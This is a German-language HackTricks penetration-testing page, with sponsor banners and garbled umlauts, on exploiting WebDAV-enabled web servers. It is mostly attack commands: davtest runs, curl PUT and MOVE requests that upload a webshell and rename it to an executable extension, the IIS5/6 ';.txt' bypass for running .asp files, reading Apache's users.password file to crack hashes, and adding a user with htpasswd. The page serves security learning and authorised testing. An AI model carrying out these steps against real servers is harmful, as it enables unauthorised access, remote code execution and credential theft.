# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
{% endhint %}

Beim Umgang mit einem **HTTP-Server mit aktiviertem WebDav** ist es m√∂glich, **Dateien zu manipulieren**, wenn Sie die richtigen **Anmeldeinformationen** haben, die normalerweise durch **HTTP Basic Authentication** √ºberpr√ºft werden. Die Kontrolle √ºber einen solchen Server zu erlangen, beinhaltet oft das **Hochladen und Ausf√ºhren einer Webshell**.

Der Zugriff auf den WebDav-Server erfordert typischerweise **g√ºltige Anmeldeinformationen**, wobei [**WebDav Bruteforce**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) eine g√§ngige Methode ist, um diese zu erhalten.

Um Einschr√§nkungen beim Hochladen von Dateien zu √ºberwinden, insbesondere solche, die die Ausf√ºhrung von serverseitigen Skripten verhindern, k√∂nnten Sie:

* **Dateien** mit **ausf√ºhrbaren Erweiterungen** direkt hochladen, wenn dies nicht eingeschr√§nkt ist.
* **Hochgeladene** nicht ausf√ºhrbare Dateien (wie .txt) in eine ausf√ºhrbare Erweiterung umbenennen.
* **Hochgeladene** nicht ausf√ºhrbare Dateien kopieren und ihre Erweiterung in eine ausf√ºhrbare √§ndern.

## DavTest

**Davtest** versucht, **mehrere Dateien mit unterschiedlichen Erweiterungen hochzuladen** und **√ºberpr√ºft**, ob die Erweiterung **ausgef√ºhrt** wird:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

Das bedeutet nicht, dass **.txt** und **.html Erweiterungen ausgef√ºhrt werden**. Das bedeutet, dass Sie **auf diese Dateien zugreifen** k√∂nnen √ºber das Web.

## Cadaver

Sie k√∂nnen dieses Tool verwenden, um sich mit dem **WebDav**-Server zu **verbinden** und Aktionen (wie **hochladen**, **verschieben** oder **l√∂schen**) **manuell** durchzuf√ºhren.
```
cadaver <IP>
```
## PUT-Anfrage
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE-Anfrage
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## IIS5/6 WebDav-Sicherheitsanf√§lligkeit

Diese Sicherheitsanf√§lligkeit ist sehr interessant. **WebDav** erlaubt **nicht**, Dateien mit der Erweiterung **.asp** zu **hochladen** oder **umzubenennen**. Aber Sie k√∂nnen dies **umgehen**, indem Sie am Ende des Namens **";.txt"** hinzuf√ºgen, und die Datei wird **ausgef√ºhrt**, als ob es sich um eine .asp-Datei handelt (Sie k√∂nnten auch **".html" anstelle von ".txt" verwenden**, aber **VERGESSEN SIE NICHT das ";"**).

Dann k√∂nnen Sie Ihre Shell als ".**txt" Datei** **hochladen** und sie in eine ".asp;.txt" Datei **kopieren/bewegen**. Wenn Sie auf diese Datei √ºber den Webserver zugreifen, wird sie **ausgef√ºhrt** (Cadaver wird sagen, dass die Verschiebeaktion nicht funktioniert hat, aber das hat sie).

![](<../../.gitbook/assets/image (1092).png>)

## Post-Anmeldeinformationen

Wenn Webdav einen Apache-Server verwendet hat, sollten Sie sich die konfigurierten Sites in Apache ansehen. √úblicherweise:\
_**/etc/apache2/sites-enabled/000-default**_

Darin k√∂nnten Sie etwas finden wie:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Wie Sie sehen k√∂nnen, gibt es die Dateien mit den g√ºltigen **credentials** f√ºr den **webdav**-Server:
```
/etc/apache2/users.password
```
Innerhalb dieser Art von Dateien finden Sie den **Benutzernamen** und einen **Hash** des Passworts. Dies sind die Anmeldeinformationen, die der WebDAV-Server verwendet, um Benutzer zu authentifizieren.

Sie k√∂nnen versuchen, sie zu **knacken**, oder **mehr hinzuzuf√ºgen**, wenn Sie aus irgendeinem Grund auf den **WebDAV**-Server **zugreifen** m√∂chten:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Um zu √ºberpr√ºfen, ob die neuen Anmeldeinformationen funktionieren, k√∂nnen Sie Folgendes tun:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## References

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)
{% hint style="success" %}
Lernen & √ºben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & √ºben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav), um einfach **Workflows** zu erstellen und **zu automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie heute Zugang:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
